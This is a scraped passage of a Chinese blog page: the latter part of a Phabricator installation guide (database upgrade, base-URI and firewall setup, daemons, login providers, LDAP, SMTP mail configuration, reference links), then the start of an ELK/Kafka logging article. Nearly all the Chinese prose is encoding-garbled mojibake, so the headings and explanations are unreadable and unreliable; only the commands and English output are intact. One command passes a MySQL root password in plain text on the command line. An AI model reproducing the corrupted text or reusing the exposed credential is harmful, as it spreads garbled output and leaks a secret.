<h4 id="é‡æ–°åˆå§‹åŒ–æ•°æ®åº“ï¼š"><a href="#é‡æ–°åˆå§‹åŒ–æ•°æ®åº“ï¼š" class="headerlink" title="é‡æ–°åˆå§‹åŒ–æ•°æ®åº“ï¼š"></a>é‡æ–°åˆå§‹åŒ–æ•°æ®åº“ï¼š</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">[root@Phabricator phabricator]<span class="comment"># ./bin/storage upgrade</span></div><div class="line">Before running storage upgrades, you should take down the Phabricator web</div><div class="line">interface and stop any running Phabricator daemons (you can <span class="built_in">disable</span> this</div><div class="line">warning with --force).</div><div class="line"></div><div class="line">    Are you ready to <span class="built_in">continue</span>? [y/N] y</div><div class="line"></div><div class="line">Loading quickstart template onto <span class="string">"localhost:3306"</span>...</div><div class="line">Applying patch <span class="string">"phabricator:db.packages"</span> to host <span class="string">"localhost:3306"</span>...</div><div class="line">Applying patch <span class="string">"phabricator:20160201.revision.properties.1.sql"</span> to host <span class="string">"localhost:3306"</span>...</div><div class="line">Applying patch <span class="string">"phabricator:20160201.revision.properties.2.sql"</span> to host <span class="string">"localhost:3306"</span>...</div><div class="line">Applying patch <span class="string">"phabricator:20160706.phame.blog.parentdomain.2.sql"</span> to host <span class="string">"localhost:3306"</span>...</div><div class="line">Applying patch <span class="string">"phabricator:20160706.phame.blog.parentsite.1.sql"</span> to host <span class="string">"localhost:3306"</span>...</div><div class="line">Applying patch <span class="string">"phabricator:20160707.calendar.01.stub.sql"</span> to host <span class="string">"localhost:3306"</span>...</div><div class="line">Applying patch <span class="string">"phabricator:20160711.files.01.builtin.sql"</span> to host <span class="string">"localhost:3306"</span>...</div><div class="line">.....</div><div class="line">.....</div><div class="line"></div><div class="line">Missing Key</div><div class="line">phabricator_search       search_documentfield     corpus            Surplus Key</div><div class="line">phabricator_search       search_documentfield     key_corpus        Missing Key</div><div class="line">phabricator_worker       worker_archivetask       key_modified      Missing Key</div><div class="line">Applying schema adjustments...</div><div class="line">Done.</div><div class="line">Completed applying all schema adjustments.</div></pre></td></tr></table></figure>
<h3 id="8-æŸ¥çœ‹æ•°æ®åº“ï¼š"><a href="#8-æŸ¥çœ‹æ•°æ®åº“ï¼š" class="headerlink" title="8 æŸ¥çœ‹æ•°æ®åº“ï¼š"></a>8 æŸ¥çœ‹æ•°æ®åº“ï¼š</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">[root@Phabricator phabricator]<span class="comment"># mysql -uroot -pqwde1dsdfg3.com</span></div><div class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</div><div class="line">Your MariaDB connection id is 177</div><div class="line">Server version: 5.5.52-MariaDB MariaDB Server</div><div class="line"></div><div class="line">Copyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.</div><div class="line"></div><div class="line">Type <span class="string">'help;'</span> or <span class="string">'\h'</span> <span class="keyword">for</span> help. Type <span class="string">'\c'</span> to clear the current input statement.</div><div class="line"></div><div class="line">MariaDB [(none)]&gt; show databases;</div><div class="line">+--------------------------+</div><div class="line">| Database                 |</div><div class="line">+--------------------------+</div><div class="line">| information_schema       |</div><div class="line">| mysql                    |</div><div class="line">| performance_schema       |</div><div class="line">| phabricator_almanac      |</div><div class="line">| phabricator_audit        |</div><div class="line">| phabricator_auth         |</div><div class="line">| phabricator_badges       |</div><div class="line">| phabricator_cache        |</div><div class="line">| phabricator_calendar     |</div><div class="line">| phabricator_chatlog      |</div><div class="line">| phabricator_conduit      |</div><div class="line">| phabricator_config       |</div><div class="line">| phabricator_conpherence  |</div><div class="line">| phabricator_countdown    |</div><div class="line">| phabricator_daemon       |</div><div class="line">| phabricator_dashboard    |</div><div class="line">| phabricator_differential |</div><div class="line">| phabricator_diviner      |</div><div class="line">| phabricator_doorkeeper   |</div><div class="line">| phabricator_draft        |</div><div class="line">| phabricator_drydock      |</div><div class="line">| phabricator_fact         |</div><div class="line">| phabricator_feed         |</div><div class="line">| phabricator_file         |</div><div class="line">| phabricator_flag         |</div><div class="line">| phabricator_fund         |</div><div class="line">|      .......             |</div><div class="line">+--------------------------+</div><div class="line">61 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</div></pre></td></tr></table></figure>
<p>â—ï¸â—ï¸æ³¨ï¼šupgradeä¹‹åï¼Œshow databasesä½ ä¼šå‘ç°å»ºç«‹äº†è®¸å¤šphabrictorå¼€å¤´çš„æ•°æ®åº“ã€‚</p>
<p>###8.1 é…ç½®URLï¼š</p>
<p>æœªé…ç½®æ­¤å®‰è£…çš„åŸºæœ¬URIï¼Œå¹¶ä¸”åœ¨é…ç½®ä¹‹å‰ï¼Œä¸»è¦åŠŸèƒ½å°†æ— æ³•æ­£å¸¸å·¥ä½œã€‚<br>æ‚¨åº”è¯¥å°†åŸºæœ¬URIè®¾ç½®ä¸ºæ‚¨å°†ç”¨äºè®¿é—®Phabricatorçš„URIï¼Œå¦‚â€œ<a href="http://phabricator.example.com/â€ã€‚" target="_blank" rel="external">http://phabricator.example.com/â€ã€‚</a><br>å¦‚æœä½¿ç”¨çš„ç«¯å£ä¸æ˜¯80ï¼ˆhttpï¼‰æˆ–443ï¼ˆhttpsï¼‰ï¼Œè¯·åŒ…æ‹¬åè®®ï¼ˆhttpæˆ–httpsï¼‰ï¼ŒåŸŸåå’Œç«¯å£å·ã€‚<br>åŸºäºæ­¤è¯·æ±‚ï¼Œæ­£ç¡®çš„è®¾ç½®ä¼¼ä¹æ˜¯ï¼š<code>http : //phabricator.ihaozhuo.com/</code><br>è¦é…ç½®åŸºæœ¬URIï¼Œè¯·è¿è¡Œä»¥ä¸‹å‘½ä»¤ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@Phabricator phabricator]<span class="comment">#  ./bin/config set phabricator.base-uri 'http://phabricator.ihaozhuo.com/'</span></div><div class="line">Set <span class="string">'phabricator.base-uri'</span> <span class="keyword">in</span> <span class="built_in">local</span> configuration.</div></pre></td></tr></table></figure>
<h3 id="9-è®¾ç½®é˜²ç«å¢™"><a href="#9-è®¾ç½®é˜²ç«å¢™" class="headerlink" title="9 è®¾ç½®é˜²ç«å¢™"></a>9 è®¾ç½®é˜²ç«å¢™</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">firewall-cmd --zone=public --permanent --add-service=http</div><div class="line">firewall-cmd --reload</div></pre></td></tr></table></figure>
<h3 id="9-1-Phabricator-Daemons-Are-Not-Running"><a href="#9-1-Phabricator-Daemons-Are-Not-Running" class="headerlink" title="9.1 Phabricator Daemons Are Not Running"></a>9.1 Phabricator Daemons Are Not Running</h3><p>å¯åŠ¨å®ˆæŠ¤è¿›ç¨‹<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">phabricator/ $ ./bin/phd start</div></pre></td></tr></table></figure></p>
<h3 id="10-å®Œæˆå®‰è£…"><a href="#10-å®Œæˆå®‰è£…" class="headerlink" title="10 å®Œæˆå®‰è£…"></a>10 å®Œæˆå®‰è£…</h3><p>é…ç½®phabricatorï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /var/www/html/phabricator/</div><div class="line">./bin/config <span class="built_in">set</span> phabricator.base-uri <span class="string">'http://your_domain_or_IP'</span></div><div class="line">./bin/phd start</div></pre></td></tr></table></figure>
<p>ä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼š<a href="http://your_domain_or_IP" target="_blank" rel="external">http://your_domain_or_IP</a></p>
<p>ç„¶åæ ¹æ®æç¤ºä¿®å¤ä¸€äº›é—®é¢˜ã€‚</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/Phabricator_01.png" alt=""></figure></p>
<p>ç™»å½•è¿›æ¥ç®¡ç†ç•Œé¢ï¼š</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/Phabricator_02.png" alt=""></figure></p>
<h3 id="åˆ›å»ºé¡¹ç›®ä¾‹å­ï¼š"><a href="#åˆ›å»ºé¡¹ç›®ä¾‹å­ï¼š" class="headerlink" title="åˆ›å»ºé¡¹ç›®ä¾‹å­ï¼š"></a>åˆ›å»ºé¡¹ç›®ä¾‹å­ï¼š</h3><p> Projects â€”â€”ã€‹ Create Project â€”â€”ã€‹å¡«å†™å¥½é¡¹ç›®åç§° â€”â€”ã€‹Create New Project </p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/Phabricator_03.png" alt=""></figure></p>
<p>åˆ›å»ºå®Œæˆæ•ˆæœï¼š</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/Phabricator_04.png" alt=""></figure></p>
<h3 id="å®‰è£…å®Œæˆä»¥åå‡ºç°10å¤šä¸ªé—®é¢˜è§£å†³ï¼š"><a href="#å®‰è£…å®Œæˆä»¥åå‡ºç°10å¤šä¸ªé—®é¢˜è§£å†³ï¼š" class="headerlink" title="å®‰è£…å®Œæˆä»¥åå‡ºç°10å¤šä¸ªé—®é¢˜è§£å†³ï¼š"></a>å®‰è£…å®Œæˆä»¥åå‡ºç°10å¤šä¸ªé—®é¢˜è§£å†³ï¼š</h3><p>æ±‰åŒ–ç¿»è¯‘è¿‡æ¥ï¼š<br> <figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/phabricator_05.png" alt=""></figure></p>
<p>â“è¯´æ˜ï¼šæŒ‰é—®é¢˜æç¤ºæ“ä½œè§£å†³æ•…éšœã€‚ä¸€èˆ¬éƒ½æœ‰é—®é¢˜ä¿®å¤è§£å†³æ–¹æ³•çš„ï¼Œå®˜æ–¹è¿™ç‚¹è¿˜æ˜¯å¾ˆä¸é”™çš„ã€‚</p>
<ul>
<li>æ£˜æ‰‹é—®é¢˜1 å¦‚æœé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼šAlternate File Domain Not Configured</li>
</ul>
<p>æ“ä½œäº†è¿™æ¡å‘½ä»¤å¤±æ•ˆ æœ€å¥½åˆ«æ“ä½œï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">phabricator/ $ ./bin/config <span class="built_in">set</span> security.alternate-file-domain &lt;domain&gt;</div><div class="line"></div><div class="line">[root@Phabricator phabricator]<span class="comment"># ./bin/config set security.alternate-file-domain http://cdn.phabricator.com</span></div></pre></td></tr></table></figure>
<p>å¦‚æœæ˜¯CDNæ•°æ®å­˜æ”¾å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤ã€‚ä¸ç„¶ä¼šå‡ºç°è®¿é—®å¤±è´¥ã€‚<br>æˆ‘æ˜¯å‚è€ƒè¿™ç¯‡æ–‡æ¡£è§£å†³é—®é¢˜ï¼š<a href="https://community.bitnami.com/t/phabricator-not-rendering-resources-over-https/39005" target="_blank" rel="external">Phabricator not rendering resources over https</a>åˆ é™¤<code>security.alternate-file-domain</code>å¯ä»¥è®¿é—®ã€‚</p>
<ul>
<li>æ£˜æ‰‹é—®é¢˜2 PHP Extension â€˜APCâ€™ Not Installed  å‚è€ƒæ–‡ç« ï¼š<a href="http://php.net/manual/zh/apc.installation.php" target="_blank" rel="external">PHP Extension â€˜APCâ€™ Not Installed</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum install php-pear</span></div><div class="line"><span class="comment"># pecl install apc</span></div><div class="line"><span class="comment"># echo "extension=apc.so" &gt;&gt; /etc/php.ini</span></div><div class="line"><span class="comment"># echo "apc.enabled=1" &gt;&gt; /etc/php.ini</span></div><div class="line"><span class="comment"># cp /usr/share/pear/apc.php /var/www/html/apc.php (this step is optional)</span></div><div class="line"><span class="comment"># /etc/init.d/httpd restart</span></div></pre></td></tr></table></figure>
<p>phabricatorå®˜ç½‘é…ç½®è¯´æ˜<a href="https://secure.phabricator.com/book/phabricator/article/configuration_guide/" target="_blank" rel="external">Configuration Guide</a></p>
<h3 id="1-èº«ä»½éªŒè¯æä¾›è€…"><a href="#1-èº«ä»½éªŒè¯æä¾›è€…" class="headerlink" title="1. èº«ä»½éªŒè¯æä¾›è€…"></a>1. èº«ä»½éªŒè¯æä¾›è€…</h3><p>Phabricatorç™»å½•çš„æ–¹æ³•è¢«ç§°ä¸ºèº«ä»½éªŒè¯æä¾›è€…ï¼ˆAuthentication Providersï¼‰ã€‚ä¾‹å¦‚,å½“æˆ‘ä»¬è®¾ç½®äº†ä¸€ä¸ªâ€ç”¨æˆ·å/å¯†ç â€èº«ä»½éªŒè¯æä¾›è€…,é‚£ä¹ˆç”¨æˆ·å¯ä»¥é€šè¿‡ä¼ ç»Ÿçš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•ã€‚Phabricatoræ”¯æŒå¤šç§ç™»å½•ç³»ç»Ÿã€‚å½“æˆ‘ä»¬ä½¿ç”¨Administratorsç™»å½•åˆ°åå°ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯ç”¨æˆ–ç¦ç”¨è¿™äº›Providersï¼Œé…ç½®ç”¨æˆ·å¦‚ä½•æ³¨å†Œæˆ–ç™»å½•åˆ°Phabricatorã€‚</p>
<p>åœ¨å…¬å¸å†…éƒ¨ä½¿ç”¨ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨<code>Username/Password</code>æˆ–LDAPï¼Œå¯¹äºå¼€æºé¡¹ç›®ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ç±»ä¼¼äºGitHubç­‰OAuthç¬¬ä¸‰æ–¹ç™»å½•ã€‚åœ¨ä½¿ç”¨<code>Username/Password</code>ç™»å½•æ–¹å¼æ—¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é™åˆ¶æ³¨å†Œç”¨æˆ·æ—¶çš„é‚®ç®±åç¼€ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®æˆå…¬å¸çš„é‚®ç®±åŸŸåã€‚</p>
<h3 id="1-1-ä¿®æ”¹ç™»å½•æ–¹å¼"><a href="#1-1-ä¿®æ”¹ç™»å½•æ–¹å¼" class="headerlink" title="1.1 ä¿®æ”¹ç™»å½•æ–¹å¼"></a>1.1 ä¿®æ”¹ç™»å½•æ–¹å¼</h3><p>ç½‘é¡µä¸Šå¯ä»¥å¯¹å…¶è¿›è¡Œç›¸åº”çš„ä¿®æ”¹ã€‚å…·ä½“ä½ç½®åœ¨ï¼š<br>å·¦ä¾§èœå•<code>Auth -&gt; Add Provider -&gt; username/password</code>(è´¦å·å¯†ç æ–¹å¼ç™»å½•)<br>æ”¯æŒ è´¦å·å¯†ç ç™»å½•ä»¥åŠç¬¬ä¸‰æ–¹ï¼ˆfacebookã€githubç­‰ï¼‰è´¦å·ç™»å½•ã€‚å¦å¤–ï¼Œå¯ä»¥é€‰æ‹©ç”¨æˆ·è‡ªä¸»æ³¨å†Œï¼Œæˆ–è€…ç¦ç”¨ï¼ˆç®¡ç†å‘˜é…ç½®ï¼‰ã€‚</p>
<p>è¿™é‡Œé€‰æ‹©LDAPåŒæ­¥éœ€è¦å®‰è£…PHP LDAPæ‰©å±•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Before you can <span class="built_in">set</span> up or use LDAP, you need to install the PHP LDAP extension. It is not currently installed, so PHP can not talk to LDAP. Usually you can install it with `yum install php-ldap`, `apt-get install php5-ldap`, or a similar package manager command.</div><div class="line"></div><div class="line">yum install php-ldap -y</div></pre></td></tr></table></figure>
<p>æ³¨ï¼šå¦‚æœç¬¬ä¸€æ¬¡ç®¡ç†å‘˜ç™»å½•ä»¥åï¼Œæ²¡æœ‰ä¿®æ”¹ç™»å½•æ–¹å¼ï¼Œæ¥ç€é€€å‡ºã€‚ä¸‹æ¬¡ç™»å½•å¯èƒ½ä¼šè¢«é”ä½ï¼Œéœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è§£é”ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/auth recover &lt;username&gt;</div></pre></td></tr></table></figure>
<h3 id="1-2-è®¾ç½®ç”¨æˆ·ç™»å½•è®¤è¯æ–¹å¼"><a href="#1-2-è®¾ç½®ç”¨æˆ·ç™»å½•è®¤è¯æ–¹å¼" class="headerlink" title="1.2 è®¾ç½®ç”¨æˆ·ç™»å½•è®¤è¯æ–¹å¼"></a>1.2 è®¾ç½®ç”¨æˆ·ç™»å½•è®¤è¯æ–¹å¼</h3><p>ä½¿ç”¨ç®¡ç†å‘˜è´¦å·ç™»å½•ï¼Œåœ¨å·¦ä¾§çš„èœå•ä¸­é€‰æ‹© Auth ï¼Œç„¶åç‚¹å‡»å³ä¸Šä¾§ Add Providerï¼Œåœ¨åˆ—è¡¨ä¸­é€‰åˆ™ä½ éœ€è¦çš„è®¤è¯æ–¹å¼ã€‚</p>
<p>æˆ‘é€‰æ‹©æ˜¯<code>Username/Password</code>çš„æ–¹å¼ï¼Œå³ç”¨æˆ·è‡ªå·±æ³¨å†Œ<code>Phabricator</code>è´¦å·ã€‚ä¸ºäº†ä¿éšœå®‰å…¨ï¼Œæˆ‘è®¾ç½®äº†åªå…è®¸å…¬å¸é‚®ç®±åœ°å€æ³¨å†Œï¼š<code>Config ---&gt; Core Settings ---&gt; Authentication ---&gt; auth.email-domains</code>ã€‚ä½ è¿˜å¯ä»¥é€‰æ‹© auth.require-approval ï¼Œå³æ–°æ³¨å†Œç”¨æˆ·éœ€è¦ç®¡ç†å‘˜æ‰¹å‡†ã€‚</p>
<h3 id="1-3-è®¾ç½®é‚®ä»¶å‘é€æœåŠ¡å‚æ•°"><a href="#1-3-è®¾ç½®é‚®ä»¶å‘é€æœåŠ¡å‚æ•°" class="headerlink" title="1.3 è®¾ç½®é‚®ä»¶å‘é€æœåŠ¡å‚æ•°"></a>1.3 è®¾ç½®é‚®ä»¶å‘é€æœåŠ¡å‚æ•°</h3><p>é¦–å…ˆï¼Œé…ç½® mail-adapter ï¼ˆé‚®ä»¶å‘é€æ–¹å¼ï¼‰ï¼š<code>Config ---&gt; Core Settings ---&gt; Mail ---&gt; metamta.mail-adapter</code>ï¼Œæˆ‘é€‰æ‹©çš„æ˜¯ PhabricatorMailImplementationPHPMailerAdapter ï¼Œé€šè¿‡SMTPçš„æ–¹å¼å‘é€é‚®ä»¶ã€‚åœ¨é€‰æ‹©å®Œä¹‹åï¼Œéœ€è¦è®¾ç½®SMTPæœåŠ¡å™¨åœ°å€ã€è´¦å·å’Œå¯†ç ï¼šConfig â€”&gt; Core Settings â€”&gt; PHPMailer â€”&gt; metamta.mail-adapterï¼Œæ ¹æ®ä½ è‡ªå·±é‚®ç®±çš„é…ç½®ï¼Œç›¸åº”çš„è®¾ç½® phpmailer.smtp-hostã€phpmailer.smtp-portã€phpmailer.smtp-protocolã€phpmailer.smtp-userã€phpmailer.smtp-passwordã€phpmailer.smtp-encoding ã€‚</p>
<h3 id="2-é‚®ç®±å…³è”"><a href="#2-é‚®ç®±å…³è”" class="headerlink" title="2.é‚®ç®±å…³è”"></a>2.é‚®ç®±å…³è”</h3><p>åˆ‡æ¢åˆ°<code>phabricator/bin/</code>ç›®å½•ä¸‹è¿è¡Œ<code>daemonï¼š./bin/phd start</code>ã€‚ æ³¨æ„æ¯æ¬¡é‡å¯éœ€è¦å†æ¬¡å¯ç”¨ï¼Œå› æ­¤å»ºè®®æ”¾åˆ°å¯åŠ¨è„šæœ¬ä¸Šã€‚</p>
<p>é…ç½®mailï¼šé€šè¿‡webè®¿é—®phabricatorå¹¶åœ¨é¡µé¢ä¸Šè¿›è¡Œé…ç½®ï¼šï¼ˆè¿™é‡Œä½¿ç”¨çš„æ˜¯å¤–éƒ¨SMTP serverçš„æ–¹å¼ï¼Œæ›´å¤šæ–¹å¼å‚è§phabricator docsï¼‰</p>
<pre><code>ç”¨administratorè´¦å·ç™»å½•åï¼Œåœ¨administrationæ é€‰æ‹©Configè¿›å…¥
</code></pre><p>1ï¼‰é€‰æ‹©mailï¼Œè®¾ç½®<br>    metamta.default-address â€“ xxxx@163.com // æ³¨æ„ï¼šè¿™é‡Œå¿…é¡»è¦ç”¨ä¸smtpæœåŠ¡å™¨å¯¹åº”çš„é‚®ç®±åœ°å€ï¼Œä¸ç„¶é‚®ä»¶å‘ä¸å‡ºå»</p>
<pre><code>metamta.domain -- phabricator.myproject.com // éšæ„

metamta.mail-adapter: set to &quot;PhabricatorMailImplementationPHPMailerAdapter&quot;

metamta.send-immediately: Send Via Daemons ï¼ˆç›®å‰ç‰ˆæœ¬è²Œä¼¼æ²¡æœ‰ï¼‰
</code></pre><p>2ï¼‰é€‰æ‹©PHPMailerï¼Œè®¾ç½®ï¼šï¼ˆä»¥163.comçš„SMTP serverä¸ºä¾‹ï¼‰<br>    phpmailer.mailer: set to â€œsmtpâ€. ï¼ˆé»˜è®¤ï¼‰</p>
<pre><code>phpmailer.smtp-host: smtp.163.com 

phpmailer.smtp-port: 25 ï¼ˆé»˜è®¤ï¼‰

phpmailer.smtp-user: xxxx

phpmailer.smtp-password: xxxx
</code></pre><p>ç›®å‰ç‰ˆæœ¬é¡µé¢ä¸Šä¸èƒ½é…ç½®PHPMailerï¼Œåªèƒ½ä½¿ç”¨å·¥å…·/bin/configå·¥å…·setç›¸å¯¹åº”çš„é…ç½®é¡¹ã€‚</p>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="string">phabricator/</span> $ ./<span class="string">bin/</span><span class="string">mail </span><span class="built_in">list-outbound</span>   <span class="comment"># List outbound mail.</span></div><div class="line"><span class="string">phabricator/</span> $ ./<span class="string">bin/</span><span class="string">mail </span><span class="string">show-outbound </span>  <span class="comment"># Show details about messages.</span></div><div class="line"><span class="string">phabricator/</span> $ ./<span class="string">bin/</span><span class="string">mail </span><span class="string">send-test </span>      <span class="comment"># Send test messages.</span></div></pre></td></tr></table></figure>
<h3 id="3-å‚è€ƒï¼š"><a href="#3-å‚è€ƒï¼š" class="headerlink" title="3. å‚è€ƒï¼š"></a>3. å‚è€ƒï¼š</h3><p><a href="https://www.oschina.net/question/191440_125562" target="_blank" rel="external">https://www.oschina.net/question/191440_125562</a>  Phabricatorå…¥é—¨æ‰‹å†Œ</p>
<p><a href="http://blog.csdn.net/zzllabcd/article/details/49997421" target="_blank" rel="external">http://blog.csdn.net/zzllabcd/article/details/49997421</a> 10.04Ubuntuå®‰è£…</p>
<p><a href="http://www.cnblogs.com/clovn/p/5103611.html" target="_blank" rel="external">http://www.cnblogs.com/clovn/p/5103611.html</a> debian7å®‰è£…</p>
<p><a href="https://secure.phabricator.com/book/phabricator/article/installation_guide/" target="_blank" rel="external">https://secure.phabricator.com/book/phabricator/article/installation_guide/</a> å®˜æ–¹guider</p>
<p><a href="https://liuzhichao.com/p/1992.html" target="_blank" rel="external">https://liuzhichao.com/p/1992.html</a>  Phabricator å®è·µä¹‹é…ç½®è´¦å·å’Œæ³¨å†Œ</p>
<p><a href="https://www.oschina.net/question/191440_125562" target="_blank" rel="external">https://www.oschina.net/question/191440_125562</a> å…¥é—¨æ‰‹å†Œ</p>
<p><a href="http://www.jianshu.com/p/b1a75a14638c" target="_blank" rel="external">http://www.jianshu.com/p/b1a75a14638c</a>  ç®€ä¹¦ä¸­çš„åˆ†äº«ï¼ˆè¾ƒä¸ºå®Œæ•´ï¼‰</p>
<p><a href="http://www.cnblogs.com/ToDoToTry/p/3956687.html" target="_blank" rel="external">http://www.cnblogs.com/ToDoToTry/p/3956687.html</a> git serveræ­å»ºæŒ‡å—</p>
<p><a href="https://my.oschina.net/miger/blog/775609" target="_blank" rel="external">https://my.oschina.net/miger/blog/775609</a> linuxå¹³å°arcå·¥å…·çš„ä½¿ç”¨</p>
<p><a href="http://blog.csdn.net/peapon/article/details/29881575" target="_blank" rel="external">http://blog.csdn.net/peapon/article/details/29881575</a> windowsä¸­arcçš„ä½¿ç”¨</p>

	

	

</article>




	<article>
	
		<h1><a href="/2016/12/29/æ—¥å¿—åˆ†æå¹³å°/Elasticsearch/æ­å»º(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°/">æ­å»º(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6 Kafka ) Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°</a></h1>
	
	<div class="article__infos">
		<span class="article__date">2016-12-29</span><br />
		
			<span class="article__category">
				<a class="article-category-link" href="/categories/Log-Analysis-Platform/">Log Analysis Platform</a>
			</span><br />
		
		
			<span class="article__tags">
			  	<a class="article__tag-link" href="/tags/Elasticsearch/">Elasticsearch</a>
			</span>
		
	</div>

	

	
		<h3 id="æ­å»º-ElasticSearch-2-x-Logstash-2-x-Kibana-4-5-x-zookeeper3-4-6-Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°"><a href="#æ­å»º-ElasticSearch-2-x-Logstash-2-x-Kibana-4-5-x-zookeeper3-4-6-Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°" class="headerlink" title="æ­å»º(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°"></a>æ­å»º(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°</h3><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>ELKæ˜¯ä¸šç•Œæ ‡å‡†çš„æ—¥å¿—é‡‡é›†,å­˜å‚¨ç´¢å¼•,å±•ç¤ºåˆ†æç³»ç»Ÿè§£å†³æ–¹æ¡ˆ</p>
<p>logstashæä¾›äº†çµæ´»å¤šæ ·çš„æ’ä»¶æ”¯æŒä¸åŒçš„input/output</p>
<p>ä¸»æµä½¿ç”¨redis/kafkaä½œä¸ºæ—¥å¿—/æ¶ˆæ¯çš„ä¸­é—´ç¯èŠ‚</p>
<p>å¦‚æœå·²æœ‰kafkaçš„ç¯å¢ƒäº†,ä½¿ç”¨kafkaæ¯”ä½¿ç”¨redisæ›´ä½³</p>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªæœ€ç®€åŒ–çš„é…ç½®åšä¸ªç¬”è®°,elasticå®˜ç½‘æä¾›äº†éå¸¸ä¸°å¯Œçš„æ–‡æ¡£</p>
<p>ä¸è¦ç”¨æœç´¢å¼•æ“å»æœç´¢,æ²¡å¤šå°‘ç»“æœçš„,è¯·ç›´æ¥çœ‹å®˜ç½‘æ–‡æ¡£</p>
<h3 id="ç‰ˆæœ¬åŠè¿æ¥"><a href="#ç‰ˆæœ¬åŠè¿æ¥" class="headerlink" title="ç‰ˆæœ¬åŠè¿æ¥"></a>ç‰ˆæœ¬åŠè¿æ¥</h3><p>elasticseearchç‰ˆæœ¬: 2.4.3</p>
